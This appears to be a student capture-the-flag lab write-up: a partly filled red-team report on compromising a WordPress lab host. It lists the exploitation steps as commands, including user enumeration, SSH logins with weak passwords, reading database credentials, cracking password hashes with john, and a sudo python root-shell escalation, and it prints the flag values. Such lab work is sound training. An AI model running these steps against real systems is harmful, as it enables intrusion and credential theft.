# Red Team: Summary of Operations

## Table of Contents
- Exposed Services
- Critical Vulnerabilities
- Exploitation

### Exposed Services

Nmap scan results for each machine reveal the below services and OS details:

```bash
$ nmap -sV -O 192.168.1.110
  # TODO: Insert scan output
```

This scan identifies the services below as potential points of entry:
- Target 1
  - Port 22/tcp | SSH | OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)
  - Port 80/tcp | http | Apache httpd 2.4.10 ((Debian))
  - Port 111/tcp | rpcbind | 2-4 (RPC #1000000)
  - Port 139/tcp | netbios-ssn | Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
  - Port 445/tcp | netbios-ssn | Samba smbd 3.X - 4.X (workgroup: WORKGROUP)

_TODO: Fill out the list below. Include severity, and CVE numbers, if possible._

The following vulnerabilities were identified on each target:
- Target 1
  - Open/Unfiltered Ports 22 & 80
  [screenshot]
  - WordPress Enumeration
  [screenshot]
  - Weak User Credentials
  [screenshot]
  - Misconfigured User Privileges on Target System
  [screenshot]
  - Brute Force Attack
  [screenshot]
  - Privilege Escalation (Python Library Hijacking)
  [screenshot]

### Exploitation

The Red Team was able to penetrate `Target 1` and retrieve the following confidential data:
- Target 1
  - `flag1.txt`: flag1{b9bbcb33e11b80be759c4e844862428d}
    - **Exploit Used**
      - Step 1: WordPress User Enumeration
        - ` wpscan --url http://192.168.1.110/wordpress --enumerate vp,u `
      [screenshot] 
      - Step 2: SSH Login Using Weak Login Credentials
        - ` ssh michael@192.168.1.110, password: michael `
        [screenshot]
      - Step 3: File Directory Search
        - ` find . -iname "*flag1*" `
        [screenshot]
        
    
  - `flag2.txt`: flag2{fc3fd58dcdad9ab23faca6e9a36e581c}
    - **Exploit Used**
      - Step 1: File Enumeration
        - ` ls -la /var/www `
      - Step 2: Misconfigured File Privileges
        - ` cat /var/www/flag2.txt `
      [screenshot]

  - `flag3.txt`: flag3{afc01ab56b50591e7dccf93122770cd2}
    - **Exploit Used**
      - Step 1: Misconfigured File Privileges
        - ` nano /var/www/html/wordpress/wp-config.php `
        [screenshot]
      - Step 2: MySQL Login
        - ` mysql --host=localhost --user=root --password=R@v3nSecurity `
        [screenshot]
      - Step 3: Database Traversal & Table Enumeration
        - ` SHOW * FROM wp_posts; `
        [screenshot]
      

  - `flag4.txt`: flag4{715dea6c055b9fe3337544932f2941ce}
    - **Exploit Used**

      - Step 1: MySQL WordPress Login Credential Enumeration
        ` SELECT user_login,user_pass FROM wp_users; ` 
        [screenshot]
      - Step 2: Brute Force
        - ` john --wordlist=rockyou.txt wp_hashes.txt `
        [screenshot]
      - Step 3: SSH Login
        - ` ssh steven@192.168.1.110, password pink84 `
        [screenshot]
      - Step 4: Sudo Privileges Check
        - ` sudo -l `
        [screenshot]
      - Step 5: Privilege Escalation with Python Shell Spawn
        - ` sudo python -c 'import pty;pty.spawn("/bin/bash")' `
        [screenshot]
